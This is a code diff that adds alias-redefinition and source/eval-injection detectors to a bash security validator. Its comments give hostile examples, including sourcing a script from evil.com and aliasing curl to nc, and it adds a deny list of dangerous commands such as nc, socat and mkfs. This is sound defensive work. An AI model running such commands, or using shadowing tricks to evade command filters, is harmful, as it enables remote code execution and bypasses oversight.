@@ -49,6 +49,8 @@ const CHECK_IDS = {
   DATA_EXFILTRATION: 49,
   ESCAPE_OBFUSCATION: 50,
   UNSAFE_HELP_COMMAND: 51,
+  ALIAS_REDEFINITION: 52,
+  SOURCE_EXECUTION: 53,
 } as const;
 
 // eslint-disable-next-line no-control-regex
@@ -920,6 +922,25 @@ export function validateBashSecurity(command: string, options?: { detachedMode?:
     }
   }
 
+  // Alias / function redefinition — blocks alias or function definitions
+  // that shadow known dangerous commands with different implementations.
+  {
+    const aliasCheck = detectAliasRedefinition(command);
+    if (aliasCheck.blocked) {
+      return fail(CHECK_IDS.ALIAS_REDEFINITION, aliasCheck.reason!);
+    }
+  }
+
+  // Source / dot-script / eval injection — blocks source/dot-script with
+  // process substitution, eval with command substitution, remote URLs,
+  // and all source/eval in detached mode (except venv activation).
+  {
+    const sourceCheck = detectSourceExecution(command, { detachedMode: detached });
+    if (sourceCheck.blocked) {
+      return fail(CHECK_IDS.SOURCE_EXECUTION, sourceCheck.reason!);
+    }
+  }
+
   result = validateObfuscatedFlags(command);
   if (!result.safe) return result;
 
@@ -1631,6 +1652,7 @@ export const CODE_LOADING_VARIABLES = [
   'ZDOTDIR',
   'NODE_OPTIONS',
   'PROMPT_COMMAND',
+  'PATH',
 ] as const;
 
 export const POLICY_SOURCE_VARIABLES = [
@@ -2394,6 +2416,174 @@ export function detectEscapeObfuscation(command: string): { blocked: boolean; re
       if (/\\x[0-9A-Fa-f]{2}|\\[0-7]{3}/.test(prePipe)) {
         return { blocked: true, reason: 'echo -e/printf with escape sequences piped to shell interpreter' };
       }
+    }
+  }
+
+  return { blocked: false };
+}
+
+// ---------------------------------------------------------------------------
+// Alias / function redefinition detector — blocks alias or function definitions
+// that shadow known dangerous commands with potentially malicious replacements.
+// ---------------------------------------------------------------------------
+// Blocked:
+//   alias rm='echo'        — shadows rm with a different command
+//   alias curl=nc           — shadows curl with nc
+//   function curl() { ... } — redefines curl as a shell function
+//   curl() { ... }          — POSIX form of function redefinition
+// Allowed:
+//   alias ll='ls -la'       — non-dangerous command aliased
+//   alias grep='grep --color=auto' — self-enhancement (same base command)
+
+const DANGEROUS_ALIAS_TARGETS = new Set([
+  'rm', 'curl', 'wget', 'nc', 'ncat', 'socat', 'dd', 'mkfs', 'chmod', 'chown',
+  'sudo', 'ssh', 'scp', 'python', 'python3', 'node', 'bash', 'sh', 'git',
+  'cat', 'cp', 'mv', 'ln', 'mount', 'umount', 'kill', 'pkill',
+]);
+
+export function detectAliasRedefinition(command: string): { blocked: boolean; reason?: string } {
+  const stripped = stripInvisibleUnicode(command);
+
+  // 1. alias name='...' or alias name="..." or alias name=value
+  const aliasPattern = /\balias\s+(\w[\w-]*)=(?:'([^']*)'|"([^"]*)"|\S+)/g;
+  let match;
+  while ((match = aliasPattern.exec(stripped)) !== null) {
+    const aliasName = match[1];
+    const value = match[2] ?? match[3] ?? '';
+
+    if (!DANGEROUS_ALIAS_TARGETS.has(aliasName)) continue;
+
+    // Allow self-enhancement: alias grep='grep --color=auto'
+    // The value starts with the same command name
+    const firstWord = value.trim().split(/\s+/)[0] || '';
+    if (firstWord === aliasName) continue;
+
+    return {
+      blocked: true,
+      reason: `alias '${aliasName}' redefines a known command — potential command shadowing`,
+    };
+  }
+
+  // 2. function name() { ... } — keyword form
+  const funcKeywordPattern = /\bfunction\s+(\w[\w-]*)\s*\(\s*\)/g;
+  while ((match = funcKeywordPattern.exec(stripped)) !== null) {
+    const funcName = match[1];
+    if (DANGEROUS_ALIAS_TARGETS.has(funcName)) {
+      return {
+        blocked: true,
+        reason: `function '${funcName}()' redefines a known command — potential command shadowing`,
+      };
+    }
+  }
+
+  // 3. function name { ... } — bash keyword form without parens
+  const funcBashPattern = /\bfunction\s+(\w[\w-]*)\s*\{/g;
+  while ((match = funcBashPattern.exec(stripped)) !== null) {
+    const funcName = match[1];
+    if (DANGEROUS_ALIAS_TARGETS.has(funcName)) {
+      return {
+        blocked: true,
+        reason: `function '${funcName}' redefines a known command — potential command shadowing`,
+      };
+    }
+  }
+
+  // 4. name() { ... } — POSIX form
+  const bareFuncPattern = /(?:^|[\s;|&(])(\w[\w-]*)\s*\(\s*\)\s*\{/g;
+  while ((match = bareFuncPattern.exec(stripped)) !== null) {
+    const funcName = match[1];
+    if (DANGEROUS_ALIAS_TARGETS.has(funcName)) {
+      return {
+        blocked: true,
+        reason: `function '${funcName}()' redefines a known command — potential command shadowing`,
+      };
+    }
+  }
+
+  return { blocked: false };
+}
+
+// ---------------------------------------------------------------------------
+// Source / dot-script / eval injection detector — blocks commands that execute
+// scripts in the current shell context or dynamically generate and run code.
+// ---------------------------------------------------------------------------
+// Blocked:
+//   source <(process_substitution) — always blocked
+//   . <(process_substitution)       — always blocked
+//   eval "$(cmd)"                   — always blocked
+//   source http://evil.com/s.sh     — always blocked (remote URL)
+//   source anything (detached mode) — blocked unless venv activation
+// Allowed:
+//   source ~/.bashrc                — standard shell config (interactive mode)
+//   source ./venv/bin/activate      — common dev workflow (all modes)
+
+export function detectSourceExecution(command: string, options?: { detachedMode?: boolean }): { blocked: boolean; reason?: string } {
+  const stripped = stripInvisibleUnicode(command);
+  const detached = options?.detachedMode === true;
+
+  // 1. Always block source/dot with process substitution: source <(...)
+  if (/\bsource\s+<\(/.test(stripped)) {
+    return {
+      blocked: true,
+      reason: 'source with process substitution loads dynamically generated code into the current shell',
+    };
+  }
+  if (/(?:^|[\s;|&(])\.\s+<\(/.test(stripped)) {
+    return {
+      blocked: true,
+      reason: 'dot-script with process substitution loads dynamically generated code into the current shell',
+    };
+  }
+
+  // 2. Always block eval with command substitution — dynamic code execution
+  //    Matches: eval "$(cmd)", eval $(cmd), eval "`cmd`", eval `cmd`
+  if (/\beval\s+(?:"\$\(|\$\(|"\`|'\$\(|\`)/.test(stripped)) {
+    return {
+      blocked: true,
+      reason: 'eval with command substitution executes dynamically generated code',
+    };
+  }
+
+  // 3. Collect source/dot targets for further inspection
+  const sourceTargets: string[] = [];
+  {
+    const re = /\bsource\s+(\S+)/g;
+    let m;
+    while ((m = re.exec(stripped)) !== null) {
+      sourceTargets.push(m[1]);
+    }
+  }
+  {
+    // Match `. file` (dot-source) but NOT `. -flag` or standalone `.`
+    // The target must start with a path character, not a dash (flag).
+    const re = /(?:^|[\s;|&(])\.\s+((?!-)\S+)/g;
+    let m;
+    while ((m = re.exec(stripped)) !== null) {
+      sourceTargets.push(m[1]);
+    }
+  }
+
+  for (const target of sourceTargets) {
+    // Skip process substitution targets (already handled above)
+    if (target.startsWith('<(')) continue;
+
+    // Always block remote URLs
+    if (/^https?:\/\//.test(target)) {
+      return {
+        blocked: true,
+        reason: `source/dot-script with remote URL '${target}' loads and executes untrusted remote code`,
+      };
+    }
+
+    // In detached mode: block everything except venv activation
+    if (detached) {
+      if (/venv\/bin\/activate$|\.venv\/bin\/activate$/.test(target)) {
+        continue; // allowed
+      }
+      return {
+        blocked: true,
+        reason: `source/dot-script '${target}' blocked in detached mode — scripts execute in the current shell context`,
+      };
     }
   }
 
